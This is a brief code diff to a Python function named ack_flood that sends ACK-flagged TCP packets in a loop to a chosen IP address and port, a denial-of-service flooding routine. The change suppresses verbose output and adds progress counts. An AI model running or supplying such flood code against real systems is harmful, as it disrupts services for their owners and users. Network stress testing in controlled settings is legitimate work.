@@ -31,7 +31,9 @@ def ack_flood(dest_ip, dest_port, packet_count=1000):
             dport=dest_port,
             flags="A"
         )
-        send(pkt, verbose=True)
+        send(pkt, verbose=False)
+        if (i + 1) % 100 == 0:
+            print("  Sent {} packets".format(i + 1))
         time.sleep(0.01)
 
 
